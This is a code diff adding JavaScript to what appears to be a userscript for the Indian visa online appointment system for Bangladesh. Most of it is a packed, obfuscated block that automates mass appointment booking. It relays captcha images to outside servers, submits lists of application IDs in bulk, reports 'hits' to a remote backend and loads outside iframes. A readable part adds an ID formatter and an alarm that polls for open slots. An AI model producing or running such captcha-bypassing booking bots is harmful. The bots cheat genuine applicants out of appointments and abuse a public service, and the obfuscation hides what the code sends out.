+            placeholder: 'Paste your BGDs here'
+        }).addClass('itext').appendTo(tdiv);
+        T1 = T0.clone().attr({
+            readonly: 'readonly',
+            placeholder: 'Your formatted BGDs will appear here'
+        }).appendTo(tdiv);
+        btndiv = $('<div>').attr({
+            id: 'bottomdiv'
+        }).appendTo(bfdiv);
+        $('<button>').appendTo(btndiv).addClass('text').html('BGD Formatter').click(function() {
+            tdiv.slideToggle();
+            hspan.fadeToggle()
+        });
+        hspan = $('<span>').appendTo(btndiv).hide();
+        pinp = $('<input type="text">').addClass('prename').val('PRE-').appendTo(hspan);
+        rspan = $('<span>').appendTo(hspan);
+        fbut = $('<button>').appendTo(hspan).addClass('text').html('Format');
+        ebut = $('<button>').appendTo(hspan).addClass('text').html('Get BGD').click(function() {
+            T0.val(JSON.stringify(IDS));
+            fbut.click()
+        });
+        fbut.click(function() {
+            var str = T0.val().toUpperCase();
+            str = str.replace(/[^\/\w\s]|_/g, ' ').replace(/\s+/g, ' ').replace(/^\s|\s$/g, '');
+            str = str.replace(/([^\d])(\d)\//g, '$10$2/').replace(/\/(\d)\//g, '/0$1/').replace(/(BGD[DCR]\w{0,7})\s+/g, '$1');
+            bgds = (str.match(/(.+?) (BGD[DCR]\w{8}) (\d\d\/\d\d\/\d\d\d\d) (\w+)\s*/g) || []).map(function(a) {
+                var ra = a.match(/(.+?) (BGD[DCR]\w{8}) (\d\d\/\d\d\/\d\d\d\d) (\w+)\s*/).slice(1);
+                ra[0] = pinp.val() + ra[0].replace(/^[\s\d]+/, '');
+                return ra
+            });
+            str = JSON.stringify(bgds).slice(1, -1).replace(/],/g, '],\n') + ',\n';
+            T1.val(str);
+            rspan.html(str.match(/BGD/g).length + '->' + bgds.length)
+        });
+        if (!window.styled) $('<link>').attr({
+            rel: 'stylesheet',
+            type: 'text/css',
+            href: BU + 'src/css/style.css?_=' + Math.random()
+        }).appendTo('head')
+    });
+    $(function() {
+        var bdiv = $('#bottomdiv'),
+            audio, ring, statusdiv, starttimer, stoptimer, stopring, cwait, checker = null,
+            curstate = null,
+            url = 'Reprint.jsp';
+
+        function now() {
+            var dt = new Date();
+            return (dt.getHours() + ':' + dt.getMinutes() + ':' + dt.getSeconds()).replace(/^(\d:)/, '0$1').replace(/:(\d):/, ':0$1:').replace(/:(\d)$/, ':0$1')
+        };
+
+        function check_stat(cb) {
+            $.get(url).done(function(r) {
+                cwait.removeClass('x');
+                r = !!r.match('BGDD1');
+                statusdiv.html('BGDD ' + (r ? 'Open' : 'Closed') + '::' + now()).css({
+                    color: r ? 'green' : 'red'
+                });
+                cb && cb(r)
+            });
+            cwait.addClass('x')
+        };
+
+        function ckrfun() {
+            check_stat(function(r) {
+                if (r == curstate) return;
+                stoptimer.click();
+                ring.play();
+                stopring.show()
+            })
+        };
+        audio = $('<audio>').prop({
+            loop: true
+        }).append($('<source>').attr({
+            type: 'audio/mpeg',
+            src: 'http://soundjax.com/reddo/97744%5EALARM.mp3'
+        })).hide().appendTo(bdiv);
+        ring = audio.get(0);
+        statusdiv = $('<button>').appendTo(bdiv).addClass('text').html('Check Status').click(function() {
+            check_stat()
+        });
+        starttimer = $('<button>').appendTo(bdiv).css({
+            color: 'green'
+        }).addClass('text').html('Start Check Timer').click(function() {
+            starttimer.hide();
+            stoptimer.show();
+            check_stat(function(a) {
+                curstate = a;
+                checker = setInterval(ckrfun, a ? 10000 : 5000)
+            })
+        });
+        stoptimer = $('<button>').appendTo(bdiv).css({
+            color: 'red'
+        }).addClass('text').html('Stop Check Timer').click(function() {
+            starttimer.show();
+            stoptimer.hide();
+            checker && clearInterval(checker)
+        }).hide();
+        stopring = $('<button>').appendTo(bdiv).addClass('text').css({
+            color: 'red'
+        }).hide().html('Stop Alarm').click(function() {
+            stopring.hide();
+            ring.pause()
+        });
+        cwait = $('<div>').addClass('loader ck').appendTo(bdiv)
+    })
+})();
+
+
+
+
+
+
+
+
+
+
+
     e = function(c) {
         return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
     };
@@ -3427,8 +4462,16 @@ $(function() {
             p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
         }
     }
+
+
     return p
-}('D.1S=[{"1z":"6o.6p.6l","71":"-","2H":"1C:\\/\\/6o.6p.6l\\/6Z\\/72.73"}];D.5Y=[];f 4G(1I,1g){u T,42,34,2q=0,3H,74,6Y,6X,1r,1Z,2J,1u,4h,3o,1y,3p,2M=$(\'[S=3r]\'),46=2M.2v(\'3h\').6T().6S(),24=2m 1f(),3u=$(\'[S=1f]\').J();u 1k=$(\'1k\'),1j={r:[],o:{}},17,3i,T,1n,2V,2Y,1y,3w=\'1N:22/44;3x,5M==\';D.6U=D.5O;$(\'4i[6W=75]\').J(\'4R\');17=$(\'<P>\').5n($(\'.3E\')).A(\'5Q 5T\');1u=$(\'<P>\').A(\'3T 3v\').h(17);$(\'<P>\').A(\'5S\').p(\'5f 76.4\').h(17);3i=$(\'<5L>\').h($(\'<2f>\').A(\'5K\').h(17));T=$(\'T[S=6A]\').A(\'7f\').h(17);1n=$(\'<P>\').A(\'5D\').h(17);2M.2v(\'2f\').A(\'7h\');1g.1t(f(B,i){t(1j.o[B[1]])H;u 1F=$(\'<P>\').A(\'5B\').h(1n);$(\'<1q>\').A(\'5F\').p(B.15).h(1F);u 1a=$(\'<1q>\').A(\'3t\').3L($(\'<1q>\').E({Q:\'5G\'}).p(\'--\')).h(1F);u O={1i:1F,1a:1a,15:B.15,1o:0,Y:B.Y,1N:{1v:B[1],3G:B[2],3F:B[3],3a:\'\',1f:3u}};1j.r.16(O);1j.o[B[1]]=O;1F.K(f(){3H.5d(\'x\');1F.A(\'x\').2j();1Z.2j();4I.J(B[1].32(0,4)+\'1\');$(\'[S=1v]\').J(B[1]);$(\'[S=3G]\').J(B[2]);$(\'[S=3F]\').J(B[3]);42=B;2q=i})});1j.r.1t(f(O,i){t(O.Y){$(\'<1q>\').A(\'3t\').E({Q:\'5J\'}).2u(O.1a).p(\'1Q 1A \'+O.Y);O.1o=1;O.1a.1b();O.1i.h(1n)}});u 4I=$(\'#7c\').2r(\'3U\').2r(\'6R\').A(\'77-79\');4I.X(\'4i\').5C(f(i,d){d=$(d);t(d.J().1O(/^1V/)){d.p(d.p().R(/^7a-/i,\'\'));d.J().1O(/0$/i)&&d.J(d.J().R(/0$/i,\'1\'))}1l d.1b()});T=$(\'[S=6A]\').F({5P:\'4Q\',7b:\'5N.23\'}).2r(\'6D\').2T(f(){u v=1Z.J();t(v.m==0)H;t(v.m!=6)H!!2y(\'3y 5R 5W 6q 6 6n 6m!!!\');D.6s=2P;1u.2c();34=42});1r=T.X(\'2p[6z]\').K(f(){u 3C,2h=\'\',1K=2m 6Q();1y&&1y.4g();1y=1K;1Z.J(\'\').2j();1K.6N(\'6O\',4h,21);1K.6K(\'12/6G;6H=x-6I-6J\');1K.8e=f(){2J.L()};1K.7Z=f(e){t(1K.7T!=4u)H;3C=1K.7j;6h(u i=0,6f=3C.m;i<6f;++i)2h+=7S.7R(3C.80(i)&8b);2h=8c(2h);D.6s=2h;1r.F(\'1p\',\'1N:22/5I;3x,\'+2h);2J.L();1Z.2j()};2J.2c();1K.87(2P)});1r.h($(\'<P>\').A(\'6x\').h(1r.82()));u 5k=[{1E:\'1f 84 7L\',M:0,1H:\'2o:-7t 4S 7u 7v\'},{1E:\'66 65 63\',M:0,1H:\'7w 1U 7r 66 65 63\'},{1E:\'7o 7x\',M:0,1H:\'7y 1U 7H 7G\'},{1E:\'1V 56\',M:-1,1H:\'7J 3r 1U 7K 7F 7E\'},{1E:\'59\',M:-1,1H:\'7A 7B 7D 1f 7C 7z 7I 4l 7p\'},{1E:\'1f 5H\',M:0,1H:\'5a 7n 7m 7k 7l\'},{1E:\'3y 5c 7q\',M:0,1H:\'3y 5c 1U 4l 7s\'},{1E:\'1f 1Q\',M:1,1H:\'3r 1f 1U 4S Y\'},];1Z=T.X(\'#3a\').A(\'5l\').6w(f(e){u c=e.25;t(c==13||(c>=48&&c<=57)||(c>=97&&c<=67))H;H 1e});3p=$(\'<3k M="7M">\').h(46).F({28:-1}).L();$(\'<1q>\').p(\'86 1A 5m 3b\').2u(3p).L();2J=$(\'<2p>\').F({1p:\'1C://6k.4T.4o/85/4T/3T/83.44\'}).L().2u(1r);1u=2J.1T().h(46).E({\'88-4t\':\'89\',\'8a\':\'-81 0 0 5y\'});$(\'[S=2o]\').L();4h=1r.F(\'1p\');1r.K();f 4K(a,b,c){$(\'<P>\').p(a).h(b).E({5j:\'5p\',5q:\'7Q\',Q:c?\'1D\':\'1w\'}).L().4r()};u 4w=$(\'<P>\').A(\'3o-7P\').h(\'1k\');3o=$(\'<4M>\').F({S:\'4Q\',1p:"4O:4J",7N:\'5E-7O 5E-7U-7Y\'}).E({5v:\'5s 4W #5t\',2t:\'29%\',2b:5r}).h(4w).5u(f(){1x(f(){u 1P=3o.4y(),43=1P.X(\'1k\'),1s=1P.X(\'T[S=7V]\'),2X=1s.X(\'[S=3b]\');u 2E=1P.X(\'2p[4t=3v]\').2v(\'1i\');2E.5i().1b();2E.1b();1P.X(\'2f\').2b(\'2s\').2t(\'2s\');t(1s.m){1s.2r(\'7W\').F({5P:\'2z\'});1s.3I(\'2f\').X(\'1i:78\').1b();1s.3I(\'2f\').2b(\'2s\').X(\'1i\').2D(4).1b();t(2X.m){2X.J(2X.X(\'4i\').2D(1).J());4n=1s.1T().L().2u(2z);4n.X(\'[S=3b]\').J(2X.J());4n.2T().1b();1x(f(){1r.K();1u.L()},3A)}1l t(3p.1U(\':6F\')){1s.X(\'[S=6L]\').2v(\'1i\').1b();$(\'<3k M=5A>\').F({S:\'3b\'}).J(\'31/6P/6M\').h(1s);t(!1s.X(\'[S=5z]\').m)$(\'<3k M=5A>\').F({S:\'5z\'}).J(\'6E 6C 3r\').h(1s);1s.1T().L().2u(2z).2T().1b();1x(f(){1r.K()},3A)}1l 1r.K()&&1u.L()&&4K(\'5m 3b!!!\',43,0)}1l{u 5g=1P.X(\'p\').p(),4s=$(\'<P>\').5n(43);1r.K()&&1u.L();u O=34[1],1c=1j.o[O];5k.1t(f(2e){t(5g.1O(2e.1H)){4K(2e.1E,4s,2e.M==1);t(2e.M==-1){1c.1a.p(2e.1E).E({Q:\'1w\'})}1l t(2e.M==1){1c.1a.p(\'1Q\').E({Q:\'1D\'});D.2B[34[1]]={1v:34[1],G:2L,1z:\'--\'};D.39()}}});u 3J=$(\'[S=4Q]\').4y().X(\'7e:3Q\');t(3J.m&&!3J.F(\'M\')){u 3m=3J.12().R(/^\\s+|\\s+$/g,\'\');3m=3m.1O(/^2y\\("([^"]+)"\\)/);t(3m)$(\'<P>\').p(3m[1]).h(4s).E({5j:\'5p\',5q:\'5y\',Q:\'1w\'})}}},4u)});2z=$(\'<4M>\').F({S:\'2z\',1p:"4O:4J"}).E({5v:\'5s 4W #5t\',2t:\'70%\',2b:5r}).h(4w).5u(f(){1x(f(){u 1P=2z.4y(),5x=1P.X(\'9B[S=9C]\');t(5x.m)1P.X(\'1k\').2b(9A).9z({9w:9x})},4u)});1x(f(){1Z.2j();2M.2c()},9y);u 2E=$(\'2p[4t=3v]\').2v(\'1i\');2E.5i().1b();2E.1b();2M.2v(\'1i\').9E(\'1i\').1b();$(\'3h[2b=18]\').1b();$(\'2f\').2b(\'2s\').2t(\'2s\');$(\'3h[2t=9J]\').2t(\'2s\');$(\'<1q>\').F({3U:\'9H\'}).h(\'1k\');1Z.A(\'5l\').9G(f(e){u l=1g.m;t(e.25==38||e.25==40);1l H;t(2q==0&&e.25==38||2q==l-1&&e.25==40)H 1e;2q+=(e.25==38?-1:1);1n.3I().2D(2q).K();H 1e});3H=1n.3I().F({28:1});3H.2D(0).K()};f 69(1I,2Z,1g,2I,2F){u 30={9j:\'1C://2N.2O.2k/2n/\',9k:\'1C://9i.3A.9h.11/2n/\',1Y:\'9e.23\',9f:\'2o.23\',5O:\'5N.23\',9g:\'9l.23\'};u 2H=2Z.2H,1j={r:[],o:{}},q={1h:[],U:[],N:[],1B:1e,1W:5,3z:58},1u,3u=$(\'[S=1f]\').J();u 1k=$(\'1k\'),17,3i,T,1n,2V,2Y,1d={1A:1e,3K:1e,3s:1e},3d,1y,3w=\'1N:22/44;3x,5M==\';u C={1G:{15:\'9m 9s\',V:3A,6c:9M},26:{15:\'9r\',V:0,4f:10},1h:{15:\'9q\',5U:4},U:{15:\'9n\'},N:{15:\'51\'},1W:{15:\'8f\'},3B:{15:\'1Q\',V:0}};17=$(\'<P>\').h($(\'.3E\')).A(\'5Q 5T\');1u=$(\'<P>\').A(\'3T 3v\').h(17);$(\'<P>\').A(\'5S\').p(\'5f 9p.2\').h(17);3i=$(\'<5L>\').h($(\'<2f>\').A(\'5K\').h(17));T=$(\'<T>\').F({9L:\'9R\'}).A(\'9T\').h(17);1n=$(\'<P>\').A(\'5D\').h(17);$.5C(C,f(k,14){t(!14.V)14.V=0;14.W=$(\'<3h>\').h($(\'<1i>\').3L($(\'<3h>\').p(14.15)).h(3i)).p(14.V)});1g.1t(f(B,i){u 1F=$(\'<P>\').A(\'5B\').h(1n);$(\'<1q>\').A(\'5F\').p(B.15).h(1F);u 1a=$(\'<1q>\').A(\'3t\').3L($(\'<1q>\').E({Q:\'5G\'}).p(\'--\')).h(1F);u O={1i:1F,1a:1a,15:B.15,1o:0,Y:B.Y,1N:{1v:B[1],3G:B[2],3F:B[3],3a:\'\',1f:3u}};1j.r.16(O);1j.o[B[1]]=O});1j.r.1t(f(O,i){t(O.Y){$(\'<1q>\').A(\'3t\').E({Q:\'5J\'}).2u(O.1a).p(\'1Q 1A \'+O.Y);O.1o=1;O.1a.1b();O.1i.h(1n)}});f 4U(){u G;t(q.N.m){G=q.N.4Y().G;C.N.W.p(q.N.m)}1l G=C.26.V++;C.26.W.p(C.26.V);$.2l(2H,{4V:\'2p\',G:G,30:30}).2C(f(r){t(r.1R&&r.1R.22){u 1Y={G:G,22:r.1R.22,2A:(2m 1f()).4D()};t(q.1B)q.1h.16(1Y);1l 4v(1Y)}1l q.N.16({G:G})&&C.N.W.p(q.N.m);C.1h.W.p(q.1h.m+(q.1B?1:0))}).4A(f(){q.N.16({G:G})&&C.N.W.p(q.N.m)});C.1W.W.p(++C.1W.V)};f 4v(1Y){q.1B=1Y;2I.F(\'1p\',\'1N:22/5I;3x,\'+1Y.22)};f 4c(){t(C.1h.5U<q.1h.m)H;u d=C.1G.V-C.26.V+q.N.m,i=d>C.26.4f?C.26.4f:d;$.2l(1I+\'3q/3n/9S\',{q:{G:2L,1z:2Z.1z,V:i}});2G(0<i--)4U()};f 3l(){u l=q.1W,1m,1X,33=(2m 1f()).4D();1m=1j.r.6i(f(a){H a.1o==0||a.1o==2}).3X(f(a,i){a.2i=i;H a}).9U(f(x,y){a=x.1o;b=y.1o;r=a==b?0:b==2?1:a==2?-1:0;r=r?r:x.2i-y.2i;H r}).3X(f(a){H a.1N});2G(q.U.m&&(33-q.U[0].2A)/2a/60>q.3z)q.N.16({G:q.U.35().G});C.N.W.p(q.N.m);C.U.W.p(q.U.m);t(!1m.m||!q.U.m)H 1d.3K=21;1d.3K=1e;t(1m.m<l)l=1m.m;t(q.U.m<l)l=q.U.m;t(1m.m>l)1m=1m.32(0,l);1X=q.U.9c(0,l);C.U.W.p(q.U.m);1y=$.2l(2H,{4V:\'8z\',30:30,1N:2x.2w({1m:1m,q:1X.3X(f(a){H[a.G,a.J]})})}).8y(f(){1d.3s=1e;1u.L()}).4A(f(){2G(1X.m)q.N.16({G:1X.35().G})}).2C(f(r){u 3j=r.1R[r.1R.m-1],1J={Y:[],3g:[]};r.1R.1t(f(14){u O=14.1v,1c=1j.o[O];8x(14.2K){36\'59\':36\'56\':1c.1o=-1;1c.1a.p(14.2K).E({Q:\'1w\'});1c.1i.h(1n);3c;36\'45\':1c.1o=2;1J.3g.16(14);1c.1a.p(\'45\').E({Q:\'1D\'});3c;36\'5a 1f\':1c.1o=0;1c.1a.p(\'--\');3c;36\'1Q\':t(1c.1o==1)3c;1c.1o=1;1J.Y.16(14);1c.1i.h(1n);1c.1a.p(\'1Q\').E({Q:\'1D\'});D.2B[14.1v]={1v:14.1v,G:2L,1z:2Z.1z};3c};q.N.16({G:1X.35().G});D.2U.16({G:2L,1z:2Z.1z,2K:14.2K,55:14.55,54:14.54})});2G(1X.m)q.U.8C(1X.4Y());C.N.W.p(q.N.m);C.U.W.p(q.U.m);C.3B.V+=1J.Y.m;C.3B.W.p(C.3B.V+\'/\'+1g.m);C.1W.W.p(C.1W.V+=r.1R.m);2V.p(\'51:\'+r.1R.m+\' 45:\'+1J.3g.m+\' 1Q:\'+1J.Y.m).E({Q:(1J.3g.m+1J.Y.m)?\'1D\':\'1w\'}).4r();2Y.p(\'<b>\'+3j.2K+\'</b>&4F;&4F;&4F;\').E({Q:3j.3g?\'1D\':\'1w\'}).4r();t(1J.Y.m)D.39();t(1d.1A&&3j.5e>-1)3d=1x(f(){1d.1A&&3l()},3j.5e*2a)}).4A(f(){t(1d.1A)3d=1x(f(){1d.1A&&3l()},5*2a)});2V.L();2Y.L();1u.2c();1d.3s=21};T.2T(f(){H 1e}).2T(f(){u 33=(2m 1f()).4D(),1Y=2P,v=2F.J();t(!q.1B)H;t(v.m!=6)H 2y(\'3y 5R 5W 6q 6 6n 6m!!!\');t((33-q.1B.2A)/2a/60>q.3z)q.N.16({G:q.1B.G});1l q.U.16({G:q.1B.G,J:v,2A:q.1B.2A});2G(q.1h.m&&(33-q.1h[0].2A)/2a/60>q.3z)q.N.16({G:q.1h.35().G});t(q.1h.m)4v(q.1h.35());1l{2I.F({1p:3w});q.1B=1e};C.1h.W.p(q.1h.m+(q.1B?1:0));C.N.W.p(q.N.m);C.U.W.p(q.U.m);2F.J(\'\');4c();t(1d.1A&&1d.3K&&q.U.m>=3)3l();D.q=q});2I.F({1p:3w}).h($(\'<P>\').A(\'6x\').h(T));2F.h(T).6w(f(e){u c=e.25;t(c==13||c==64||(c>=48&&c<=57)||(c>=97&&c<=67))H;H 1e});2V=$(\'<P>\').A(\'6e 8G\').h(17);2Y=$(\'<P>\').A(\'6e\').E({Q:\'#8F\'}).h(17);u 2d=$();$(\'<P>\').h(T);$(\'<Z M="Z">\').F({28:-1}).A(\'12 3f\').p(\'8E\').E({Q:\'8u\'}).h(T).K(f(){4c()});$(\'<Z M="Z">\').F({28:-1}).A(\'12 3f\').p(\'&#8t;\').E({6g:\'5Z\',Q:\'1D\'}).h(T).K(f(){t(C.1G.V<C.1G.6c)C.1G.W.p(C.1G.V+=10)});$(\'<Z M="Z">\').F({28:-1}).A(\'12 3f\').p(\'&#8k;\').E({6g:\'5Z\',Q:\'1w\'}).h(T).K(f(){t(C.1G.V>10)C.1G.W.p(C.1G.V-=10)});2d=2d.6B($(\'<Z M="Z">\').F({28:-1}).A(\'12 3f\').p(\'5w\').E({Q:\'1D\'}).h(T).K(f(){1y&&1y.4g();1d.8g=21;1d.1A=21;3l();2d.68()}));2d=2d.6B($(\'<Z M="Z">\').F({28:-1}).A(\'12 3f\').p(\'4j\').E({Q:\'1w\'}).h(T).K(f(){1y&&1y.4g();3d&&6j(3d);1d.3s=1e;1d.1A=1e;2d.68()}).L())};$(f(){t(3P.2g!=\'1C://2N.2O.2k/2n/2o.23\')H;t(D.62)H 2y(\'8o 8p\');D.62=1;u i=-1,l=1g.m>1S.m?1S.m:1g.m,1I=4H+\'../\',47=[];D.5V=21;$(\'<4z>\').F({5b:\'4Z\',M:\'12/E\',2g:4H+\'1p/E/52.E?2i=\'+53.50()}).h(\'1k\');$(\'4z\').6i(f(i,d){H $(d).F(\'2g\')==\'8I.E\'}).32(1).1b();u 2I=$(\'2p[6z]\').1T(),2F=$(\'#3a\').1T().2r(\'3U\').2r(\'8J\');$(\'<P>\').A(\'3E\').h(\'1k\');u 49={};1g.1t(f(1g,j){1g.1t(f(B,i){B.15=(i<9?\'0\':\'\')+(i+1)+\'. \'+B[0];B[1]=B[1].R(/[\\s.,]/g,\'\').4m();B[3]=B[3].R(/[\\s.,]/g,\'\').4m();B[2]=B[2].R(/[\\s.,]/g,\'\').R(/[\\s.,]/g,\'\').R(/^(\\d)\\//,\'0$1/\').R(/\\/(\\d)\\//,\'/0$1/\').R(/\\/([93]\\d)$/,\'/19$1\').R(/\\/(\\d\\d)$/,\'/20$1\');47.16({15:B.15,1v:B[1],3G:B[2],3F:B[3],G:2L,1z:j<1S.m?1S[j].1z:\'--\'});49[B[1]]=B})});$.2l(1I+\'3q/3n/94\',{1n:2x.2w(47)}).2C(f(r){r.1N.1t(f(24,i){49[24.1v].Y=24.Y});2G(++i<l)69(1I,1S[i],1g[i],2I.1T(),2F.1T());t(9b 4G==\'f\'){u 3D=[];1g.1t(f(6b){3D=3D.9a(6b)});4G(1I,3D)}});$(\'<3k M="99">\').h($(\'.3E\'));u 3e=$(\'[S=3a]\');t(3e.m>1)3e.2D(3e.m-1).98(f(){3e.2D(0).2j()});D.39=f(){u 37=[];D.2U.m&&$.2l(1I+\'3q/3n/8X\',{1W:2x.2w(D.2U)});6h(u z 2k D.2B)37.16(D.2B[z]);37.m&&$.2l(1I+\'3q/3n/8Q\',{Y:2x.2w(37)}).2C(f(){37.1t(f(a){8V D.2B[a.1v]})});D.2U=[];6j(D.4p);D.4p=1x(D.39,1*6r)};D.2U=[];D.2B={};D.4p=1x(D.39,1*6r);1x(f(){u 3Q=21,1L=$(\'#4k\'),6d=$(\'<4M>\').F({1p:"4O:4J"}).L().h(\'1k\');$(\'<Z>\').h(1L).A(\'12\').p(\'3N t I 8T 8S\').K(f(){t(1S.m)$.4L(1S[0].2H).2C(f(r){D.8U=r;t(r.1O(\'6k.8W-8R.4o/8L\'))2y(\'4a 4q 1U 5X, 8K 8M 6v 4q 8N 8P 8O 8Y.\');1l t(3Q){3Q=1e;5Y.1t(f(a,i){1x(f(){t(!D.96)6d.F({1p:"1C://"+a.1z})},i*60*2a)})}1l 2y(\'4a 4q 1U 4l 5X 4e\')})}).K()},2a)});(f(){t(3P.2g!=\'1C://2N.2O.2k/2n/\'&&3P.2g!=\'1C://2N.2O.2k/2n/95.p\'&&3P.2g!=\'1C://2N.2O.2k/2n/2o.23\')H;t(D.61)H;D.61=1;$(f(){u 1k=$(\'1k\'),41,4C,4N,3M,6u,2S,2W,4B,27;41=$(\'<P>\').A(\'90\').h(1k);2S=$(\'<P>\').h(41).L();2W=$(\'<8Z>\').F({6t:\'91 6v 1j 6a\'}).A(\'92\').h(2S);4B=2W.1T().F({6y:\'6y\',6t:\'4a 8q 1j 8r 8s 6a\'}).h(2S);4d=$(\'<P>\').F({3U:\'4k\'}).h(41);$(\'<Z>\').h(4d).A(\'12\').p(\'1V 8n\').K(f(){2S.8m();27.8h()});27=$(\'<1q>\').h(4d).L();4C=$(\'<3k M="12">\').A(\'8i\').J(\'8j-\').h(27);4N=$(\'<1q>\').h(27);3M=$(\'<Z>\').h(27).A(\'12\').p(\'8l\');6u=$(\'<Z>\').h(27).A(\'12\').p(\'8D 1V\').K(f(){2W.J(2x.2w(1g));3M.K()});3M.K(f(){u 1M=2W.J().4m();1M=1M.R(/[^\\/\\w\\s]|2i/g,\' \').R(/\\s+/g,\' \').R(/^\\s|\\s$/g,\'\');1M=1M.R(/([^\\d])(\\d)\\//g,\'$10$2/\').R(/\\/(\\d)\\//g,\'/0$1/\').R(/(1V[4E]\\w{0,7})\\s+/g,\'$1\');1m=(1M.1O(/(.+?) (1V[4E]\\w{8}) (\\d\\d\\/\\d\\d\\/\\d\\d\\d\\d) (\\w+)\\s*/g)||[]).3X(f(a){u 3S=a.1O(/(.+?) (1V[4E]\\w{8}) (\\d\\d\\/\\d\\d\\/\\d\\d\\d\\d) (\\w+)\\s*/).32(1);3S[0]=4C.J()+3S[0].R(/^[\\s\\d]+/,\'\');H 3S});1M=2x.2w(1m).32(1,-1).R(/],/g,\'],\\n\')+\',\\n\';4B.J(1M);4N.p(1M.1O(/1V/g).m+\'->\'+1m.m)});t(!D.5V)$(\'<4z>\').F({5b:\'4Z\',M:\'12/E\',2g:4H+\'1p/E/52.E?2i=\'+53.50()}).h(\'8H\')});$(f(){u 1L=$(\'#4k\'),2Q,3W,4P,3Y,2R,3V,3Z,3R=2P,4x=2P,4X=\'2o.23\';f 4e(){u 24=2m 1f();H(24.8B()+\':\'+24.8w()+\':\'+24.8v()).R(/^(\\d:)/,\'0$1\').R(/:(\\d):/,\':0$1:\').R(/:(\\d)$/,\':0$1\')};f 3O(4b){$.4L(4X).2C(f(r){3Z.5d(\'x\');r=!!r.1O(\'4R\');4P.p(\'8A \'+(r?\'9Q\':\'5H\')+\'::\'+4e()).E({Q:r?\'1D\':\'1w\'});4b&&4b(r)});3Z.A(\'x\')};f 5h(){3O(f(r){t(r==4x)H;2R.K();3W.9N();3V.2c()})};2Q=$(\'<2Q>\').9P({9O:21}).3L($(\'<9o>\').F({M:\'2Q/9t\',1p:\'1C://9u.4o/9v/9F%9I.9K\'})).L().h(1L);3W=2Q.4L(0);4P=$(\'<Z>\').h(1L).A(\'12\').p(\'3N 9D\').K(f(){3O()});3Y=$(\'<Z>\').h(1L).E({Q:\'1D\'}).A(\'12\').p(\'5w 3N 5o\').K(f(){3Y.L();2R.2c();3O(f(a){4x=a;3R=6V(5h,a?7g:7d)})});2R=$(\'<Z>\').h(1L).E({Q:\'1w\'}).A(\'12\').p(\'4j 3N 5o\').K(f(){3Y.2c();2R.L();3R&&7i(3R)}).L();3V=$(\'<Z>\').h(1L).A(\'12\').E({Q:\'1w\'}).L().p(\'4j 7X\').K(f(){3V.L();3W.8d()});3Z=$(\'<P>\').A(\'3T 9d\').h(1L)})})();', 62, 615, '|||||||||||||||function||appendTo|||||length|||html|caps|||if|var||||||addClass|pr|II|window|css|attr|usr|return||val|click|hide|type|used|bgd|div|color|replace|name|form|ready|count|hnd|find|taken|button|||text||el|slug|push|rpane|||res|remove|hbgd|hitf|false|Date|IDS|wait|tr|BGDs|body|else|bgds|list|sts|src|span|_img|iform|forEach|_wait|fileno|red|setTimeout|_xhr|domain|on|live|http|green|tag|zcc|trdl|look|base|xdt|xhr|bdiv|str|data|match|icont|Taken|rsp|servers|clone|is|BGD|hits|kaps|cap|_imgn||true|image|jsp|dt|keyCode|trds|hspan|tabIndex||1000|height|show|cbut|ndl|table|href|pstr|_|focus|in|post|new|visa|Reprint|img|iij|removeAttr|auto|width|insertAfter|closest|stringify|JSON|alert|pframe|loaded|takens|done|eq|trt|capy|while|appurl|capx|_wimg|kase|_usr|getapp|indianvisaonline|gov|null|audio|stoptimer|tdiv|submit|hitlogs|Msgbx|T0|abc|msgbx|server|links||slice|nw|curfile|shift|case|tkns||fireUpdater|ImgNum|DATE|break|_tmh|zz|ihit|success|td|itbl|lkase|input|genhit|mstr|logger|frame|ichk|viz|Appointment|busy|emss|today|top|esrc|base64|Access|xpiry|100|tkn|bstr|oids|mainframe|passport_no|birthdate|bells|children|scrp|sleep|append|fbut|Check|check_stat|location|first|checker|ra|loader|id|stopring|ring|map|starttimer|cwait||bfdiv|cfile|ibody|gif|Success|egtd|lbgd||oprs|Your|cb|fillgaps|btndiv|now|step|abort|imgsrc|option|Stop|bottomdiv|not|toUpperCase|zform|com|uptimer|IP|fadeIn|msdv|align|200|showcap|framecont|curstate|contents|link|fail|T1|pinp|getTime|DCR|nbsp|setupFallback|BU|msk|blank|showMess|get|iframe|rspan|about|statusdiv|tframe|BGDD1|already|mytreedb|fetchimage|task|solid|url|pop|stylesheet|random|Used|style|Math|duration|time|Expired|||IncorrectFile|No|rel|code|removeClass|delay|Striker|bdtx|ckrfun|next|textAlign|needles|pre|NO|prependTo|Timer|center|fontSize|360|1px|C0C0C0|load|border|Start|ipdf|20px|SAVE|hidden|lli|each|bgdlist|allow|bgname|gray|Closed|jpeg|orange|info|tbody|R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw|ReprintAppt|appt|target|rightpane|Code|caption|ex|min|styled|should|blocked|hitservers|bold||bset|aset|Error||Server|Internal|102|toggle|setupBlock|here|ids|max|efrm|msg|len|fontWeight|for|filter|clearTimeout|www|net|long|letters|jubayer|site40|be|60000|capimage|placeholder|ebut|your|keypress|iholder|readonly|alt|OnlineForm|add|The|onclick|Confirm|checked|plain|charset|user|defined|overrideMimeType|EXIT|2014|open|GET|07|XMLHttpRequest|onchange|empty|prev|run|setInterval|value|ndate|ndttr|pages||ip|nest|php|ztr|BGDD0|V1|mission|last|select|BANGLADESH|action|pia|5000|script|headera|10000|hiderow|clearInterval|responseText|are|available|Dates|Apppointment|Under|exists|Invalid|an|valid|Print|Registered|application|There|Maintenance|System|Birth|File|Number|of|or|within|only|maintenance|under|does|New|possible|Opened|checkbox|sandbox|forms|container|48px|fromCharCode|String|status|same|example|onsubmit|Alarm|origin|onload|charCodeAt|10px|parent|ajax_loader_blue_32|Not|uploads|PDF|send|vertical|middle|margin|0xff|btoa|pause|onerror|Hits|started|fadeToggle|prename|PRE|8681|Format|slideToggle|Formatter|Avoided|Duplicate|formatted|will|appear|8679|blue|getSeconds|getMinutes|switch|always|hit|BGDD|getHours|unshift|Get|Refill|00A|big|head|Online|onkeyup|Please|resources|change|by|the|reconnecting|logtaken|hosting|Blocked|am|myres|delete|main|loghit|modem|textarea|bottomspace|Paste|itext|6789|logbgd|index|nohit||blur|radio|concat|typeof|splice|ck|Rimage|rep|allot|129|164|dom|dip|allotmentsave|Thread|Ready|source|V2|Waiting|Threads|Limit|mpeg|soundjax|reddo|scrollTop|318|500|animate|1200|embed|plugin|Status|nextAll|97744|keydown|GETAPPT|5EAL